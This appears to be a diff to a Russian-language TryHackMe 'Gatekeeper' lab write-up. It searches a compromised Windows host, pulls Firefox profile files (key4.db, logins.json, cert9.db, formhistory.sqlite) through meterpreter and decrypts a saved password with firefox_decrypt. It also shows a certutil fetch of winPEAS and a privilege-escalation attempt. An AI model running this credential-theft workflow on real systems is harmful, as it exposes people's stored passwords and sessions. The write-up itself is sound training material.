@@ -696,6 +696,35 @@ C:\Users\natbat\Desktop>
 
 ## ⚙️ Привилегии
 
+Запоминаю пользователя `mayor`
+```cmd
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users
+
+05/14/2020  09:57 PM    <DIR>          .
+05/14/2020  09:57 PM    <DIR>          ..
+04/19/2020  11:55 AM    <DIR>          mayor
+05/14/2020  09:58 PM    <DIR>          natbat
+05/14/2020  09:54 PM    <DIR>          Public
+05/14/2020  09:58 PM    <DIR>          Share
+```
+
+Поиск по имени пользователя `mayor` дал 2 интересных результата
+```cmd
+findstr /S /I /L "mayor" C:\*.* 2>nul
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\formhistory.sqlite:SQLite formatindexmoz_formhistory_guid_indexmoz_formhistoryCREATE INDEX moz_formhistory_guid_index ON moz_formhistory(guid) I+ indexmoz_formhistory_lastused_indexmoz_formhistoryCREATE INDEX moz_formhistory_lastused_index ON moz_formhistory(lindexmoz_formhistory_indexmoz_formhistoryCREATE INDEX moz_formhistory_index ON moz_formhistory(fieldname) ▒;; Gtablemoz_deleted_formhistorymoz_deleted_formhistoryCREATE TABLE moz_deleted_formhistory (id INTEGER PRIMARY KEY, timeDeleted INTEGER, guid TEXT) Q++ Ytablemoz_formhistorymoz_formhistoryCREATE TABLE moz_formhistory (id INTEGER PRIMARY KEY, fieldname TEXT NOT NULL, value TEXT NOT NULL, timesUsed INTEGER, firstUsed INTEGER, lastUsed INTEGER, guidx~  ~  ~ -usernamemayor  TR P    %`fL5Agk/DTrSUtwE6!    -usernamegatekeeper   L    L CtX0GtKKTgm8hXIf/G -searchbar-historynet framework 4.0303 download    D     D eehK4K7gQO+0dnVQ7O     -originhttps://savedadmincreds@creds.com   R P  TR PYoKFyCACRtujSbWG
+
+C:\Windows\Panther\unattend.xml:     <Username>mayor</Username> 
+C:\Windows\Panther\unattend.xml:       <Name>mayor</Name>
+```
+`C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\formhistory.sqlite`  
+`C:\Windows\Panther\unattend.xml`  
+
 Генерирую оболочку `meterpreter`, запускаю сервер
 ```bash
 ┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
@@ -753,8 +782,96 @@ Meterpreter     : x86/windows
 meterpreter >
 ```
 
+Смотрю содержимое директории
+```cmd
+C:\Users\natbat\Downloads>cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\
+cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
+05/14/2020  10:45 PM    <DIR>          .
+05/14/2020  10:45 PM    <DIR>          ..
+05/14/2020  10:30 PM                24 addons.json
+05/14/2020  10:23 PM             1,952 addonStartup.json.lz4
+05/14/2020  10:45 PM                 0 AlternateServices.txt
+05/14/2020  10:30 PM    <DIR>          bookmarkbackups
+05/14/2020  10:24 PM               216 broadcast-listeners.json
+04/22/2020  12:47 AM           229,376 cert9.db
+04/21/2020  05:00 PM               220 compatibility.ini
+04/21/2020  05:00 PM               939 containers.json
+04/21/2020  05:00 PM           229,376 content-prefs.sqlite
+05/14/2020  10:45 PM           524,288 cookies.sqlite
+05/14/2020  10:24 PM    <DIR>          crashes
+05/14/2020  10:45 PM    <DIR>          datareporting
+04/21/2020  05:00 PM             1,111 extension-preferences.json
+04/21/2020  05:00 PM    <DIR>          extensions
+05/14/2020  10:34 PM            39,565 extensions.json
+05/14/2020  10:45 PM         5,242,880 favicons.sqlite
+05/14/2020  10:39 PM           196,608 formhistory.sqlite
+04/21/2020  10:50 PM    <DIR>          gmp-gmpopenh264
+04/21/2020  10:50 PM    <DIR>          gmp-widevinecdm
+04/21/2020  05:00 PM               540 handlers.json
+04/21/2020  05:02 PM           294,912 key4.db
+05/14/2020  10:43 PM               600 logins.json
+04/21/2020  05:00 PM    <DIR>          minidumps
+05/14/2020  10:23 PM                 0 parent.lock
+05/14/2020  10:25 PM            98,304 permissions.sqlite
+04/21/2020  05:00 PM               506 pkcs11.txt
+05/14/2020  10:45 PM         5,242,880 places.sqlite
+05/14/2020  10:45 PM            11,096 prefs.js
+05/14/2020  10:45 PM            65,536 protections.sqlite
+05/14/2020  10:45 PM    <DIR>          saved-telemetry-pings
+05/14/2020  10:23 PM             2,715 search.json.mozlz4
+05/14/2020  10:45 PM                 0 SecurityPreloadState.txt
+04/21/2020  10:50 PM    <DIR>          security_state
+05/14/2020  10:45 PM               288 sessionCheckpoints.json
+05/14/2020  10:45 PM    <DIR>          sessionstore-backups
+05/14/2020  10:45 PM            12,889 sessionstore.jsonlz4
+04/21/2020  05:00 PM                18 shield-preference-experiments.json
+05/14/2020  10:45 PM             1,357 SiteSecurityServiceState.txt
+04/21/2020  05:00 PM    <DIR>          storage
+05/14/2020  10:45 PM             4,096 storage.sqlite
+04/21/2020  05:00 PM                50 times.json
+05/14/2020  10:45 PM                 0 TRRBlacklist.txt
+04/21/2020  05:00 PM    <DIR>          weave
+04/21/2020  05:02 PM            98,304 webappsstore.sqlite
+05/14/2020  10:45 PM               140 xulstore.json
+              33 File(s)     12,300,786 bytes
+              14 Dir(s)  15,886,876,672 bytes free
+```
+
+Эти файлы могут дать доступ к учетным данным, если:
+- Есть доступ к key4.db + logins.json → можно расшифровать пароли (иногда cert9.db тоже нужен).
+- Есть cookies.sqlite → можно украсть сессии.
+- Есть formhistory.sqlite → можно получить логины из истории автозаполнения.
+
+Скачиваю их себе на `kali`
+```bash
+meterpreter > download C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\cert9.db /home/kali/Labs/TryHackMe/Win\ Medium\ -\ Gatekeeper/exploits/victim_files/
+[*] Downloading: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/cert9.db
+[*] Downloaded 224.00 KiB of 224.00 KiB (100.0%): C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/cert9.db
+[*] Completed  : C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/cert9.db
+meterpreter > download C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\key4.db /home/kali/Labs/TryHackMe/Win\ Medium\ -\ Gatekeeper/exploits/victim_files/
+[*] Downloading: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/key4.db
+[*] Downloaded 288.00 KiB of 288.00 KiB (100.0%): C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/key4.db
+[*] Completed  : C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/key4.db
+meterpreter > download C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\logins.json /home/kali/Labs/TryHackMe/Win\ Medium\ -\ Gatekeeper/exploits/victim_files/
+[*] Downloading: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/logins.json
+[*] Downloaded 600.00 B of 600.00 B (100.0%): C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/logins.json
+[*] Completed  : C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/logins.json
+meterpreter > download C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\\formhistory.sqlite /home/kali/Labs/TryHackMe/Win\ Medium\ -\ Gatekeeper/exploits/victim_files/
+[*] Downloading: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\formhistory.sqlite -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/formhistory.sqlite
+[*] Downloaded 192.00 KiB of 192.00 KiB (100.0%): C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\formhistory.sqlite -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/formhistory.sqlite
+[*] Completed  : C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\formhistory.sqlite -> /home/kali/Labs/TryHackMe/Win Medium - Gatekeeper/exploits/victim_files/formhistory.sqlite
+```
+
 Загрузил `winpeas`
-```ps
+```cmd
 certutil -urlcache -f http://10.21.104.16:8888/winPEAS.bat winpeas.bat
 ```
 
@@ -847,7 +964,25 @@ msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
 [+] Deleted 
 [*] Exploit completed, but no session was created.
 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > 
+```
 
+Дальше посмотрю файлы `firefox`, и вернусь к выводу `winpeas`, если с ними не получится.  
+Использую `firefox_decrypt`  
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
+└─$ git clone https://github.com/unode/firefox_decrypt.git
+```
+
+И получаю креды
+```bash
+┌──(.venv)─(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Medium - Gatekeeper/exploits/firefox_decrypt]
+└─$ python3 firefox_decrypt.py ../victim_files 
+2025-07-24 23:53:56,135 - WARNING - profile.ini not found in ../victim_files
+2025-07-24 23:53:56,136 - WARNING - Continuing and assuming '../victim_files' is a profile location
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
 ```
 
 ## 🏁 Флаги
